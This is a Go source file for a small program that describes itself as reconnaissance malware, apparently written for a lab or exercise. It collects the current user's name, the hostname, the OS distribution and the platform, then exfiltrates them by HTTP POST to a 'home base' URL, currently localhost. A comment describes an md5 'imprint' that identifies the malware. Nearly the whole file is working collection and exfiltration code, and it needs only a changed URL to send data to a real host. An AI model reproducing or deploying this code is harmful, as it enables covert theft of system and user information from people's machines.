package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/user"
	"strings"
	"embed"
	"github.com/elastic/go-sysinfo"
)

//go:embed imprint.txt
var fd embed.FS

func collectInfo() string {
	returnString := "\n================= SYSINFO =================\n"

	host, err := sysinfo.Host()
	checkError(err)

	// Obtaining info using os and go-sysinfo
	currentuser, _ := user.Current()
	username := currentuser.Username
	hostname := host.Info().Hostname
	distro := host.Info().OS.Name + " " + host.Info().OS.Version 
	platform := host.Info().OS.Platform

	// Assembling the string
	strUsername := "❓ Username: " + username + "\n"
	strHostname := "🏡 Hostname: " + hostname + "\n"
	strDistro := "📀 Distro: " + distro + "\n"
	strPlatform := "🖥️ Platform: " + platform + "\n"

	returnString = returnString + strUsername + strHostname + strDistro + strPlatform
	return returnString
}

func exfilInfo(info string, url string) {
	fmt.Println("[*] Sending the following info: ")
	fmt.Println(info)
	
	body := strings.NewReader(info) // needs it as a reader format
	req, err := http.NewRequest("POST", url, body)
	checkError(err)
	
	res, err := http.DefaultClient.Do(req)
	checkError(err)

	// maybe the server can respond with something ¯\_(ツ)_/¯
	data, _ := ioutil.ReadAll(res.Body) 
	res.Body.Close()
	Use(data)

	fmt.Println("[+] Success!")
}

func checkError(e error){
	if e != nil {
		fmt.Printf("Something went wrong! %s\n", e)
		os.Exit(1)
	}
}

// https://stackoverflow.com/questions/21743841/how-to-avoid-annoying-error-declared-and-not-used
func Use(vals ...interface{}) {
    for _, val := range vals {
        _ = val
    }
}

func main(){
	// Imprint string for malware identification
	// let imprint_string = md5sum(Engineer's Name:Favorite TCG Card)
	// kali@kali~:$ echo 'an00b:yoggsaron' | md5sum
	// 	f4b76de3b87463baa926ecd58fdbcb69
	imprint, _ := fd.ReadFile("imprint.txt")
	Use(imprint)

	fmt.Println("[!] Beep boop, I am gopher-recon-bot! I will collect information from this endpoint and send it back to home base.")
	returnString := collectInfo()
	exfilInfo(returnString, "http://127.0.0.1")
	fmt.Println("[*] All done! Goodbye!")
}